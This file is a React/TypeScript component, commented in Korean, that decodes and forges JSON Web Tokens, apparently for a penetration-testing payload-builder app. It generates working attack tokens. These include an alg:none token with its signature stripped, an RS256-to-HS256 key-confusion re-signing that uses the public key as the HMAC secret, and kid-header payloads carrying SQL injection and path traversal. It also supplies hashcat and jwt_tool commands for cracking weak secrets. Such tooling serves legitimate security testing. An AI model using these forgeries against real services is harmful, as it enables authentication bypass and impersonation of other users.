import { useMemo, useState } from 'react'
import { DISCLAIMER, Note, Readout, TextInput } from './shared'

/* JWT 디코딩/위조 도구. smart-decoder·smart-decoder-tree·decoder.tsx 와는 완전히 독립된
   구현이다(그 파일들은 수정하지 않는다). 전부 브라우저 로컬 연산이며 어떤 요청도 보내지 않는다. */

function base64urlDecode(str: string): string {
  let t = str.replace(/-/g, '+').replace(/_/g, '/')
  t = t + '='.repeat((4 - (t.length % 4)) % 4)
  return atob(t)
}

function base64urlEncode(str: string): string {
  return btoa(str).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '')
}

const encodeJson = (obj: unknown) => base64urlEncode(JSON.stringify(obj))

/** 공개키 PEM 텍스트를 그대로 HMAC 시크릿으로 써서 재서명한다(RS256→HS256 key confusion). */
async function signHmacSha256(keyText: string, data: string): Promise<string> {
  const encoder = new TextEncoder()
  const key = await crypto.subtle.importKey('raw', encoder.encode(keyText), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign'])
  const signature = await crypto.subtle.sign('HMAC', key, encoder.encode(data))
  return base64urlEncode(String.fromCharCode(...new Uint8Array(signature)))
}

export function JwtForgeBuilder() {
  const [jwt, setJwt] = useState('')
  const [publicKey, setPublicKey] = useState('')
  const [signatureResult, setSignatureResult] = useState('서명 버튼을 클릭하세요.')
  const [signError, setSignError] = useState<string | null>(null)

  const parts = jwt.trim().split('.')

  const decoded = useMemo(() => {
    if (parts.length < 2) return { header: null as Record<string, unknown> | null, payload: null as Record<string, unknown> | null, error: null as string | null }
    try {
      const header = JSON.parse(base64urlDecode(parts[0]))
      const payload = JSON.parse(base64urlDecode(parts[1]))
      return { header, payload, error: null }
    } catch {
      return { header: null, payload: null, error: 'JWT 디코딩 중 오류 발생: 유효하지 않은 Base64URL/JSON 포맷입니다.' }
    }
  }, [jwt])

  const algNoneJwt = useMemo(() => {
    if (!decoded.header || !decoded.payload) return ''
    const header = { ...decoded.header, alg: 'none' }
    return `${encodeJson(header)}.${encodeJson(decoded.payload)}.`
  }, [decoded])

  const kidSqliJwt = useMemo(() => {
    const header = { alg: 'RS256', typ: 'JWT', kid: "' UNION SELECT 'attacker-secret'-- -" }
    return `${encodeJson(header)}.${encodeJson({ sub: '123' })}.SIGNATURE`
  }, [])

  const kidPathTraversalJwt = useMemo(() => {
    const header = { alg: 'RS256', typ: 'JWT', kid: '../../../../dev/null' }
    return `${encodeJson(header)}.${encodeJson({ sub: '123' })}.SIGNATURE`
  }, [])

  const handleRS256toHS256 = async () => {
    if (!decoded.header || !decoded.payload) { setSignError('먼저 유효한 JWT를 입력하세요.'); return }
    try {
      setSignError(null)
      const header = { ...decoded.header, alg: 'HS256' }
      const dataToSign = `${encodeJson(header)}.${encodeJson(decoded.payload)}`
      const sig = await signHmacSha256(publicKey, dataToSign)
      setSignatureResult(`${dataToSign}.${sig}`)
    } catch {
      setSignError('서명 생성 중 오류 발생: 공개키 텍스트 또는 JWT 데이터를 확인하세요.')
    }
  }

  return (
    <div className="payload-builder">
      <Note>{DISCLAIMER}</Note>

      <label className="payload-builder-label">JWT 입력</label>
      <textarea className="payload-builder-textarea" rows={3} value={jwt} onChange={e => setJwt(e.target.value)} placeholder="eyJhbGciOiJIUzI1NiJ9...."/>
      {decoded.error && <Note>{decoded.error}</Note>}

      <div className="payload-readout-group">
        <strong className="payload-group-title">디코딩 결과</strong>
        <Readout title="Header" value={decoded.header ? JSON.stringify(decoded.header, null, 2) : '(JWT를 입력하세요)'} wrap="pre" />
        <Readout title="Payload" value={decoded.payload ? JSON.stringify(decoded.payload, null, 2) : '(JWT를 입력하세요)'} wrap="pre" />
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">alg: none 공격</strong>
        <Readout title="변조된 JWT (서명 제거)" value={algNoneJwt || '(JWT를 입력하세요)'} wrap="anywhere" />
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">RS256 → HS256 Key Confusion</strong>
        <TextInput label="공개키 PEM (HMAC 시크릿으로 재사용)" value={publicKey} onChange={setPublicKey} placeholder="-----BEGIN PUBLIC KEY-----"/>
        <button className="diag-guided-primary" onClick={() => void handleRS256toHS256()}>Web Crypto로 HS256 재서명</button>
        <Readout title="HS256 재서명 결과" value={signatureResult} wrap="anywhere" />
        {signError && <Note>{signError}</Note>}
        <Note>브라우저 로컬 연산(crypto.subtle.sign)으로만 서명하며 서버로 아무것도 전송하지 않습니다. CLI로 검증하려면: python3 jwt_tool.py &lt;JWT&gt; -X k -pk public.pem</Note>
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">kid(Key ID) 헤더 조작</strong>
        <Readout title="SQLi 유도 kid" value={kidSqliJwt} wrap="anywhere" />
        <Readout title="경로 탐색 kid" value={kidPathTraversalJwt} wrap="anywhere" />
        <Note>SIGNATURE 부분은 실제로 서명할 수 없으므로 자리표시자입니다. 서버가 kid 값을 그대로 키 조회·파일 경로에 사용해 attacker-secret 또는 /dev/null(빈 키)로 검증하는지 확인합니다.</Note>
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">약한 시크릿 사전대입</strong>
        <Readout title="Hashcat 사전 대입" value="hashcat -m 16500 jwt_file.txt wordlist.txt" wrap="anywhere" />
        <Note>jwt_file.txt에는 대상 JWT 원문 한 줄만 넣습니다. -m 16500은 JWT(HS256) 모드입니다.</Note>
      </div>
    </div>
  )
}

export default JwtForgeBuilder
